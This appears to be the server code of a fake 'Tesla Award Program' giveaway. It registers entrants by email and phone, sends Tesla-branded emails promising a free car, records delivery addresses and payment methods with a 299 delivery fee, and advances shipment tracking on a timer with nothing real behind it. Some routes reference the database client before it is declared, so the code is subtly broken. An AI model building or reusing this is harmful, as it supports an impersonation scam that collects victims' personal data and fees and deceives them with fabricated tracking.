import { Router } from "express";
import crypto from "crypto";
import { v4 as uuidv4 } from "uuid";
import nodemailer from "nodemailer";
import { logger } from "../lib/logger";
import { getSupabaseAdmin } from "../lib/supabase";

const router = Router();

type TimelineItem = { stage: string; timestamp: string | null; completed: boolean };
type OrderResponse = {
  orderId: string; trackingNumber: string; email: string; entryId: string;
  selectedCar: Record<string, string>;
  deliveryDetails: Record<string, string>;
  deliveryMethod: Record<string, string | number>;
  paymentMethod: Record<string, string>;
  status: string; orderDate: string; estimatedDelivery: string;
  timeline: TimelineItem[];
};

const resendTimestamps: Record<string, number> = {};

const smtpUser = process.env["SMTP_USER"] || "";
const smtpPass = process.env["SMTP_PASS"] || "";
const transporter = nodemailer.createTransport({ service: "gmail", auth: { user: smtpUser, pass: smtpPass } });

function getBaseUrl(): string {
  const configured = process.env["PUBLIC_BASE_URL"]?.trim();
  if (configured) return configured.replace(/\/$/, "");
  const domains = process.env["REPLIT_DOMAINS"] ?? "";
  const primary = domains.split(",")[0]?.trim();
  return primary ? `https://${primary}` : `http://localhost:${process.env["PORT"] ?? 8080}`;
}

router.post("/entry", async (req, res) => {
  try {
    const { email, phone, firstName, lastName } = req.body as { email: string; phone: string; firstName?: string; lastName?: string };
    if (!email || !phone) { res.status(400).json({ error: "Email and phone number are required." }); return; }
    const emailKey = email.toLowerCase().trim();
    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailKey)) { res.status(400).json({ error: "Please enter a valid email address." }); return; }

    const supabase = await getSupabaseAdmin();
    const { data: existing, error: lookupError } = await supabase.from("giveaway_users").select("id").eq("email", emailKey).maybeSingle();
    if (lookupError) throw lookupError;
    if (existing) { res.status(409).json({ error: "This email has already been entered. Only one entry per person is allowed." }); return; }

    const verificationToken = crypto.randomBytes(32).toString("hex");
    const authResult = await supabase.auth.admin.createUser({ email: emailKey, phone, email_confirm: false, user_metadata: { firstName: firstName ?? "", lastName: lastName ?? "" } });
    if (authResult.error && !authResult.error.message.toLowerCase().includes("already")) throw authResult.error;

    const { data: entry, error } = await supabase.from("giveaway_users").insert({
      auth_user_id: authResult.data.user?.id ?? null,
      email: emailKey, phone, first_name: firstName ?? "", last_name: lastName ?? "", verification_token: verificationToken,
      verification_status: "verified", entry_count: 1,
    }).select("id").single();
    if (error) {
      if (error.code === "23505") { res.status(409).json({ error: "This email has already been entered. Only one entry per person is allowed." }); return; }
      throw error;
    }

    const verifyLink = `${getBaseUrl()}/api/verify?token=${verificationToken}&email=${encodeURIComponent(emailKey)}`;
    await transporter.sendMail({ from: `"Tesla Award Program" <${smtpUser}>`, to: emailKey, subject: "⚡ Verify Your Email — Tesla Award Program", html: buildVerificationEmail(firstName || "there", verifyLink, entry.id) });
    logger.info({ email: emailKey }, "Verification email sent");
    res.json({ success: true, message: "Entry submitted! Check your email to verify.", entryId: entry.id });
  } catch (err) { logger.error({ err }, "Entry error"); res.status(500).json({ error: "Server error. Please try again." }); }
});

router.get("/verify", async (req, res) => {
  try {
    const { token, email } = req.query as { token?: string; email?: string };
    if (!token || !email) { res.redirect("/verify-error.html?reason=invalid"); return; }
    const emailKey = email.toLowerCase();
    const supabase = await getSupabaseAdmin();
    const { data: entry, error } = await supabase.from("giveaway_users").select("id,email,verification_token,auth_user_id").eq("email", emailKey).maybeSingle();
    if (error) throw error;
    if (!entry) { res.redirect("/verify-error.html?reason=notfound"); return; }
    if (entry.verification_token !== token) { res.redirect("/verify-error.html?reason=invalid_token"); return; }

    await supabase.from("giveaway_users").update({ verification_status: "verified", verified_at: new Date().toISOString() }).eq("id", entry.id);
    if (entry.auth_user_id) await supabase.auth.admin.updateUserById(entry.auth_user_id, { email_confirm: true });
    const sessionToken = crypto.randomBytes(32).toString("hex");
    const { error: sessionError } = await supabase.from("user_sessions").insert({ token: sessionToken, user_id: entry.id });
    if (sessionError) throw sessionError;
    res.redirect(`/dashboard.html?session=${sessionToken}`);
  } catch (err) { logger.error({ err }, "Verify error"); res.redirect("/verify-error.html?reason=server"); }
});

router.post("/resend", async (req, res) => {
  try {
    const { email } = req.body as { email: string };
    if (!email) { res.status(400).json({ error: "Email is required." }); return; }
    const emailKey = email.toLowerCase();
    const supabase = await getSupabaseAdmin();
    const { data: entry, error } = await supabase.from("giveaway_users").select("id,first_name,verification_token,verification_status").eq("email", emailKey).maybeSingle();
    if (error) throw error;
    if (!entry) { res.status(404).json({ error: "Email address not found. Please enter the program first." }); return; }
    if (entry.verification_status === "verified") { res.status(409).json({ error: "This email has already been verified." }); return; }
    const lastResend = resendTimestamps[emailKey];
    if (lastResend && Date.now() - lastResend < 60_000) { res.status(429).json({ error: "Please wait 60 seconds before requesting another email." }); return; }
    resendTimestamps[emailKey] = Date.now();
    const verifyLink = `${getBaseUrl()}/api/verify?token=${entry.verification_token}&email=${encodeURIComponent(emailKey)}`;
    await transporter.sendMail({ from: `"Tesla Award Program" <${smtpUser}>`, to: emailKey, subject: "⚡ Verification Email Resent — Tesla Award Program", html: buildVerificationEmail(entry.first_name || "there", verifyLink, entry.id) });
    res.json({ success: true, message: "Verification email resent." });
  } catch (err) { logger.error({ err }, "Resend error"); res.status(500).json({ error: "Failed to resend email. Please try again." }); }
});

router.post("/login", async (req, res) => {
  try {
    const { email, phone } = req.body as { email?: string; phone?: string };
    if (!email || !phone) { res.status(400).json({ error: "Email and phone number are required." }); return; }
    const emailKey = email.toLowerCase().trim();
    const normalizedPhone = phone.replace(/\D/g, "");
    const supabase = await getSupabaseAdmin();
    const { data: entry, error } = await supabase.from("giveaway_users").select("id,email,phone,first_name,last_name,verification_status,verification_token").eq("email", emailKey).maybeSingle();
    if (error) throw error;
    if (!entry || entry.phone.replace(/\D/g, "") !== normalizedPhone) {
      res.status(401).json({ error: "We could not match that email and phone number." });
      return;
    }
    const sessionToken = crypto.randomBytes(32).toString("hex");
    const { error: sessionError } = await supabase.from("user_sessions").insert({ token: sessionToken, user_id: entry.id });
    if (sessionError) throw sessionError;
    // Check if user already has an order
    const { data: existingOrder } = await supabase.from("orders").select("order_id,tracking_number,status").eq("user_id", entry.id).maybeSingle();
    res.json({ success: true, sessionToken, user: { email: entry.email, firstName: entry.first_name || "", lastName: entry.last_name || "", entryId: entry.id, phone: entry.phone || "" }, hasOrder: !!existingOrder, order: existingOrder || null });
  } catch (err) { logger.error({ err }, "Login error"); res.status(500).json({ error: "Login failed. Please try again." }); }
});

async function getSessionUser(sessionToken?: string) {
  if (!sessionToken) return null;
  const supabase = await getSupabaseAdmin();
  const { data, error } = await supabase.from("user_sessions").select("token,user_id,giveaway_users(id,email,phone,first_name,last_name)").eq("token", sessionToken).gt("expires_at", new Date().toISOString()).maybeSingle();
  if (error) throw error;
  const user = Array.isArray(data?.giveaway_users) ? data?.giveaway_users[0] : data?.giveaway_users;
  return user ? { ...user, entryId: data!.user_id } as any : null;
}

router.get("/session", async (req, res) => {
  try {
    const user = await getSessionUser((req.query as { token?: string }).token);
    if (!user) { res.status(401).json({ valid: false }); return; }
    // Check if user already has an order
    const { data: existingOrder } = await supabase.from("orders").select("order_id,tracking_number,status").eq("user_id", user.id).maybeSingle();
    res.json({ valid: true, user: { email: user.email, firstName: user.first_name || "", lastName: user.last_name || "", entryId: user.entryId, phone: user.phone || "" }, hasOrder: !!existingOrder, order: existingOrder || null });
  } catch (err) { logger.error({ err }, "Session error"); res.status(500).json({ valid: false }); }
});

router.post("/order", async (req, res) => {
  try {
    const { sessionToken, selectedCar, deliveryDetails, deliveryMethod, paymentMethod } = req.body as { sessionToken: string; selectedCar: Record<string, string>; deliveryDetails: Record<string, string>; deliveryMethod?: Record<string, string | number>; paymentMethod?: Record<string, string> };
        const user = await getSessionUser(sessionToken);
    if (!user) { res.status(401).json({ error: "Invalid session. Please verify your email first." }); return; }
    
    // Check if user already has an order
    const { data: existingOrder, error: orderCheckError } = await supabase.from("orders").select("id").eq("user_id", user.id).maybeSingle();
    if (orderCheckError) throw orderCheckError;
    if (existingOrder) { res.status(400).json({ error: "You have already placed an order. Each user is restricted to one order only." }); return; }
    const supabase = await getSupabaseAdmin();
    const orderId = "TSLA-" + uuidv4().substring(0, 8).toUpperCase();
    const trackingNumber = "TRK-" + crypto.randomBytes(4).toString("hex").toUpperCase();
    const method = deliveryMethod ?? { id: "standard", name: "Standard Delivery", price: 299 };
    const estimatedDelivery = calcEstimatedDelivery(method.id === "express" ? 2 : 10);
    const { data: carRow, error: carError } = await supabase.from("selected_cars").insert({ user_id: user.id, data: selectedCar ?? {} }).select("id").single();
    if (carError) throw carError;
    const { data: deliveryRow, error: deliveryError } = await supabase.from("delivery_details").insert({ user_id: user.id, data: deliveryDetails ?? {} }).select("id").single();
    if (deliveryError) throw deliveryError;
    const { data: orderRow, error: orderError } = await supabase.from("orders").insert({ order_id: orderId, tracking_number: trackingNumber, user_id: user.id, selected_car_id: carRow.id, delivery_details_id: deliveryRow.id, delivery_method: method, payment_method: paymentMethod ?? { id: "unknown", name: "Not specified" }, status: "confirmed", estimated_delivery: estimatedDelivery }).select("id,order_date").single();
    if (orderError) throw orderError;
    const timeline = defaultTimeline(new Date(orderRow.order_date).toISOString());
    const { error: trackingError } = await supabase.from("tracking_data").insert(timeline.map((t, i) => ({ order_id: orderRow.id, stage: t.stage, stage_order: i, timestamp: t.timestamp, completed: t.completed })));
    if (trackingError) throw trackingError;
    const order = { orderId, trackingNumber, email: user.email, entryId: user.entryId, selectedCar: selectedCar ?? {}, deliveryDetails: deliveryDetails ?? {}, deliveryMethod: method, paymentMethod: paymentMethod ?? { id: "unknown", name: "Not specified" }, status: "confirmed", orderDate: new Date(orderRow.order_date).toISOString(), estimatedDelivery, timeline };
    // Send confirmation email (best effort)
    try {
      await transporter.sendMail({ from: `"Tesla Giveaway" <${smtpUser}>`, to: user.email, subject: "🎉 Order Confirmed — Your Tesla is on the way!", html: buildOrderConfirmationEmail(order) });
      logger.info({ email: user.email, orderId }, "Order confirmation email sent");
    } catch (emailErr) { logger.warn({ err: emailErr }, "Failed to send order confirmation email"); }
    res.json({ success: true, order });
  } catch (err) { logger.error({ err }, "Order error"); res.status(500).json({ error: "Server error. Please try again." }); }
});

router.get("/order/tracking/:trackingNumber", async (req, res) => {
  try {
    const order = await loadOrderBy("tracking_number", req.params["trackingNumber"] ?? "");
    if (!order) { res.status(404).json({ error: "Tracking number not found." }); return; }
    res.json({ order: simulateProgress(order) });
  } catch (err) { logger.error({ err }, "Tracking lookup error"); res.status(500).json({ error: "Server error." }); }
});

router.get("/order/:orderId", async (req, res) => {
  try {
    const order = await loadOrderBy("order_id", req.params["orderId"] ?? "");
    if (!order) { res.status(404).json({ error: "Order not found." }); return; }
    res.json({ order: simulateProgress(order) });
  } catch (err) { logger.error({ err }, "Order lookup error"); res.status(500).json({ error: "Server error." }); }
});

async function loadOrderBy(column: "order_id" | "tracking_number", value: string): Promise<OrderResponse | null> {
  const supabase = await getSupabaseAdmin();
  const { data, error } = await supabase.from("orders").select("id,order_id,tracking_number,status,order_date,estimated_delivery,delivery_method,payment_method,giveaway_users(id,email),selected_cars(data),delivery_details(data),tracking_data(stage,stage_order,timestamp,completed)").eq(column, value).maybeSingle();
  if (error) throw error;
  if (!data) return null;
  const user = Array.isArray(data.giveaway_users) ? data.giveaway_users[0] : data.giveaway_users;
  const car = Array.isArray(data.selected_cars) ? data.selected_cars[0] : data.selected_cars;
  const delivery = Array.isArray(data.delivery_details) ? data.delivery_details[0] : data.delivery_details;
  const tracking = ((data.tracking_data ?? []) as any[]).sort((a, b) => a.stage_order - b.stage_order).map((t) => ({ stage: t.stage, timestamp: t.timestamp, completed: t.completed }));
  return { orderId: data.order_id, trackingNumber: data.tracking_number, email: user?.email ?? "", entryId: user?.id ?? "", selectedCar: car?.data ?? {}, deliveryDetails: delivery?.data ?? {}, deliveryMethod: data.delivery_method ?? {}, paymentMethod: data.payment_method ?? {}, status: data.status, orderDate: new Date(data.order_date).toISOString(), estimatedDelivery: data.estimated_delivery, timeline: tracking };
}

// ── HELPERS ───────────────────────────────────────────────────────────
function defaultTimeline(orderDate: string): TimelineItem[] {
  return [
    { stage: "Order Confirmed", timestamp: orderDate, completed: true },
    { stage: "Processing", timestamp: null, completed: false },
    { stage: "Shipped", timestamp: null, completed: false },
    { stage: "In Transit", timestamp: null, completed: false },
    { stage: "Out for Delivery", timestamp: null, completed: false },
    { stage: "Delivered", timestamp: null, completed: false },
  ];
}

function calcEstimatedDelivery(days: number): string {
  const d = new Date();
  d.setDate(d.getDate() + days);
  return d.toISOString().split("T")[0]!;
}

function simulateProgress(order: OrderResponse) {
  const now = new Date();
  const orderDate = new Date(order.orderDate);
  const hrs = (now.getTime() - orderDate.getTime()) / 3_600_000;

  const updated = { ...order, timeline: order.timeline.map(t => ({ ...t })) };

  function advance(idx: number, hoursNeeded: number, status: string) {
    if (hrs > hoursNeeded && !updated.timeline[idx]!.completed) {
      updated.timeline[idx]!.completed = true;
      updated.timeline[idx]!.timestamp = new Date(orderDate.getTime() + hoursNeeded * 3_600_000).toISOString();
      updated.status = status;
    }
  }

  advance(1, 1,  "processing");
  advance(2, 24, "shipped");
  advance(3, 48, "in_transit");
  advance(4, 72, "out_for_delivery");
  advance(5, 96, "delivered");

  return updated;
}

// ── EMAIL TEMPLATES ───────────────────────────────────────────────────
function buildVerificationEmail(firstName: string, verifyLink: string, entryId: string) {
  return `<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Verify Email</title></head>
<body style="margin:0;padding:0;background:#F7F8FA;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;">
<table width="100%" cellpadding="0" cellspacing="0" style="background:#F7F8FA;padding:40px 0;">
<tr><td align="center">
<table width="560" cellpadding="0" cellspacing="0" style="background:#FFFFFF;border-radius:20px;overflow:hidden;max-width:560px;box-shadow:0 8px 32px rgba(0,0,0,.08);">
  <tr><td style="background:#171A20;padding:32px 40px;text-align:center;">
    <span style="color:#E31937;font-size:26px;font-weight:900;letter-spacing:.12em;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;">TESLA AWARD PROGRAM</span>
  </td></tr>
  <tr><td style="padding:0;"><div style="height:4px;background:linear-gradient(90deg,#E31937,#ff6b6b);"></div></td></tr>
  <tr><td style="padding:44px 40px;">
    <h1 style="font-size:26px;font-weight:800;color:#171A20;margin:0 0 12px;line-height:1.2;">Hi ${firstName}, you're almost in! ⚡</h1>
    <p style="font-size:16px;color:#5C5E62;line-height:1.7;margin:0 0 32px;">You've submitted your entry for a chance to win a brand-new Tesla. One final step remains — verify your email address to confirm your entry and unlock your winner dashboard.</p>
    <table width="100%" cellpadding="0" cellspacing="0"><tr><td align="center">
      <a href="${verifyLink}" style="display:inline-block;background:#E31937;color:#FFFFFF;text-decoration:none;padding:16px 48px;border-radius:12px;font-size:16px;font-weight:700;letter-spacing:.02em;">Verify My Email Address</a>
    </td></tr></table>
    <p style="font-size:13px;color:#B0B3B8;text-align:center;margin:24px 0 0;line-height:1.6;">Or paste this link into your browser:<br><span style="color:#E31937;word-break:break-all;font-size:12px;">${verifyLink}</span></p>
    <hr style="border:none;border-top:1px solid #E5E7EB;margin:32px 0;">
    <table width="100%" cellpadding="0" cellspacing="0" style="background:#F7F8FA;border-radius:12px;">
    <tr><td style="padding:18px 20px;">
      <p style="margin:0 0 6px;font-size:12px;color:#B0B3B8;font-weight:700;text-transform:uppercase;letter-spacing:.06em;">Entry Details</p>
      <p style="margin:0;font-size:14px;color:#5C5E62;">Entry ID: <span style="color:#171A20;font-family:monospace;font-weight:600;">${entryId}</span></p>
      <p style="margin:4px 0 0;font-size:14px;color:#5C5E62;">Status: <span style="color:#E31937;font-weight:600;">Pending Verification</span></p>
    </td></tr>
    </table>
  </td></tr>
  <tr><td style="background:#F7F8FA;padding:24px 40px;border-top:1px solid #E5E7EB;">
    <p style="margin:0;font-size:12px;color:#B0B3B8;text-align:center;line-height:1.6;">© 2026 Tesla Award Program. All rights reserved.<br>This is an independent award program. Tesla® is a registered trademark of Tesla, Inc.</p>
  </td></tr>
</table>
</td></tr>
</table>
</body>
</html>`;
}

function buildOrderConfirmationEmail(order: any) {
  const car = order.selectedCar || {};
  const addr = order.deliveryDetails || {};
  const method = order.deliveryMethod || {};
  const carId = (car.id || 'models').toLowerCase();
  
  const imgMap: Record<string, string> = {
    cybertruck: 'https://puebwzumwqizgbmksrpq.supabase.co/storage/v1/object/public/vehicle-images/cybertruck-main.png',
    modely: 'https://puebwzumwqizgbmksrpq.supabase.co/storage/v1/object/public/vehicle-images/modely-main.png',
    models: 'https://puebwzumwqizgbmksrpq.supabase.co/storage/v1/object/public/vehicle-images/models-main.png',
    model3: 'https://puebwzumwqizgbmksrpq.supabase.co/storage/v1/object/public/vehicle-images/model3-main.png',
    modelx: 'https://puebwzumwqizgbmksrpq.supabase.co/storage/v1/object/public/vehicle-images/modelx-main.png'
  };
  const carImg = imgMap[carId] || imgMap['models'];
  const carModel = car.name || 'Model S';
  const carPrice = car.price || '—';
  const orderId = order.orderId || '—';
  const trackingNumber = order.trackingNumber || '—';
  const estDelivery = order.estimatedDelivery || '—';
  const delivMethod = (method.name || 'Standard Delivery');
  const payMethod = (order.paymentMethod?.name || 'Not specified');
  const fullName = addr.fullName || '—';
  const address = addr.address || '—';
  const city = addr.city || '—';
  const state = addr.state || '—';
  const zip = addr.zipCode || '—';
  const country = addr.country || '—';
  const phone = addr.phone || '—';

  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Order Confirmed — Tesla Award Program</title>
</head>
<body style="margin:0;padding:0;background-color:#f4f5f7;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;">
  <table width="100%" border="0" cellpadding="0" cellspacing="0" style="background-color:#f4f5f7;padding:40px 0;">
    <tr>
      <td align="center">
        <table width="620" border="0" cellpadding="0" cellspacing="0" style="background-color:#ffffff;border-radius:20px;overflow:hidden;box-shadow:0 6px 30px rgba(0,0,0,0.06);max-width:620px;">
          <tr>
            <td align="center" style="background:linear-gradient(135deg,#0a0c10 0%,#171a20 40%,#2a1a1f 100%);padding:32px 30px 28px;">
              <table border="0" cellpadding="0" cellspacing="0">
                <tr>
                  <td align="center" style="padding-bottom:14px;">
                    <span style="display:inline-block;background:linear-gradient(135deg,#E31937,#ff4757);color:#fff;border-radius:50%;width:68px;height:68px;line-height:68px;font-size:36px;text-align:center;">✓</span>
                  </td>
                </tr>
                <tr>
                  <td align="center">
                    <h1 style="margin:0;font-size:30px;font-weight:900;color:#ffffff;letter-spacing:-0.5px;">Order Confirmed!</h1>
                    <p style="margin:10px 0 0;font-size:16px;color:rgba(255,255,255,0.7);line-height:1.5;">Congratulations — your Tesla award has been successfully processed.</p>
                  </td>
                </tr>
              </table>
            </td>
          </tr>
          <tr>
            <td style="height:5px;background:linear-gradient(90deg,#E31937,#ff6b6b,#E31937);"></td>
          </tr>
          <tr>
            <td style="padding:40px 35px;">
              <table width="100%" border="0" cellpadding="0" cellspacing="0" style="background:linear-gradient(135deg,#f8f9fa,#eef0f2);border-radius:14px;margin-bottom:28px;border:1px solid rgba(0,0,0,0.04);">
                <tr>
                  <td align="center" style="padding:24px 20px 20px;">
                    <img src="${carImg}" alt="Tesla ${carModel}" style="width:100%;max-width:300px;height:auto;display:block;margin:0 auto 14px;filter:drop-shadow(0 8px 16px rgba(0,0,0,0.1));">
                    <h3 style="margin:0;font-size:22px;font-weight:800;color:#171a20;">Tesla ${carModel}</h3>
                    <p style="margin:6px 0 0;font-size:14px;color:#5c5e62;">Retail Value: <strong>${carPrice}</strong></p>
                    <span style="display:inline-block;background:#E31937;color:#fff;font-size:12px;font-weight:700;padding:6px 16px;border-radius:20px;margin-top:10px;letter-spacing:0.04em;text-transform:uppercase;">FREE Award Vehicle</span>
                  </td>
                </tr>
              </table>
              <table width="100%" border="0" cellpadding="0" cellspacing="0" style="margin-bottom:24px;">
                <tr>
                  <td style="padding-bottom:12px;">
                    <h3 style="margin:0;font-size:13px;font-weight:700;text-transform:uppercase;letter-spacing:0.06em;color:#8d9096;">📋 Order Summary</h3>
                  </td>
                </tr>
                <tr>
                  <td style="background:#f8f9fa;border-radius:10px;padding:0;">
                    <table width="100%" border="0" cellpadding="0" cellspacing="0" style="font-size:14px;">
                      <tr><td style="padding:14px 18px;border-bottom:1px solid rgba(0,0,0,0.04);color:#5c5e62;width:50%;">Order ID</td><td style="padding:14px 18px;border-bottom:1px solid rgba(0,0,0,0.04);text-align:right;color:#E31937;font-family:'Courier New',monospace;font-weight:700;font-size:13px;">${orderId}</td></tr>
                      <tr><td style="padding:14px 18px;border-bottom:1px solid rgba(0,0,0,0.04);color:#5c5e62;">Tracking Number</td><td style="padding:14px 18px;border-bottom:1px solid rgba(0,0,0,0.04);text-align:right;color:#171a20;font-family:'Courier New',monospace;font-weight:700;font-size:13px;">${trackingNumber}</td></tr>
                      <tr><td style="padding:14px 18px;border-bottom:1px solid rgba(0,0,0,0.04);color:#5c5e62;">Estimated Delivery</td><td style="padding:14px 18px;border-bottom:1px solid rgba(0,0,0,0.04);text-align:right;color:#00a550;font-weight:700;">${estDelivery}</td></tr>
                      <tr><td style="padding:14px 18px;border-bottom:1px solid rgba(0,0,0,0.04);color:#5c5e62;">Delivery Method</td><td style="padding:14px 18px;border-bottom:1px solid rgba(0,0,0,0.04);text-align:right;color:#171a20;font-weight:600;">${delivMethod}</td></tr>
                      <tr><td style="padding:14px 18px;color:#5c5e62;">Payment Method</td><td style="padding:14px 18px;text-align:right;color:#171a20;font-weight:600;">${payMethod}</td></tr>
                    </table>
                  </td>
                </tr>
              </table>
              <table width="100%" border="0" cellpadding="0" cellspacing="0" style="margin-bottom:28px;">
                <tr>
                  <td style="padding-bottom:12px;">
                    <h3 style="margin:0;font-size:13px;font-weight:700;text-transform:uppercase;letter-spacing:0.06em;color:#8d9096;">🚚 Delivery Information</h3>
                  </td>
                </tr>
                <tr>
                  <td style="background:#f8f9fa;border-radius:10px;padding:20px 18px;">
                    <p style="margin:0 0 6px;font-size:15px;font-weight:700;color:#171a20;">${fullName}</p>
                    <p style="margin:0 0 2px;font-size:14px;color:#5c5e62;">${address}</p>
                    <p style="margin:0 0 2px;font-size:14px;color:#5c5e62;">${city}, ${state} ${zip}</p>
                    <p style="margin:0 0 8px;font-size:14px;color:#5c5e62;">${country}</p>
                    <p style="margin:0;font-size:13px;color:#8d9096;">📱 ${phone}</p>
                  </td>
                </tr>
              </table>
              <table width="100%" border="0" cellpadding="0" cellspacing="0" style="margin-bottom:8px;">
                <tr>
                  <td align="center">
                    <a href="https://joshbond123.github.io/Tesla/track.html?order=${orderId}&tracking=${trackingNumber}" style="display:inline-block;background:linear-gradient(135deg,#E31937,#c41030);color:#ffffff;text-decoration:none;padding:16px 40px;border-radius:12px;font-size:16px;font-weight:700;letter-spacing:0.02em;box-shadow:0 6px 20px rgba(227,25,55,0.3);">📍 Track Your Order →</a>
                  </td>
                </tr>
              </table>
            </td>
          </tr>
          <tr>
            <td style="background-color:#f8f9fa;border-top:1px solid #eef0f2;padding:24px 35px;text-align:center;">
              <p style="margin:0 0 8px;font-size:12px;color:#8d9096;line-height:1.6;">Need help? Reply to this email or visit our support center.<br>&copy; 2026 Tesla Award Program. All rights reserved.</p>
              <p style="margin:0;font-size:11px;color:#b0b3b8;">Tesla&reg; is a registered trademark of Tesla, Inc. This is an independent award program.</p>
            </td>
          </tr>
        </table>
      </td>
    </tr>
  </table>
</body>
</html>`;
}

export default router;
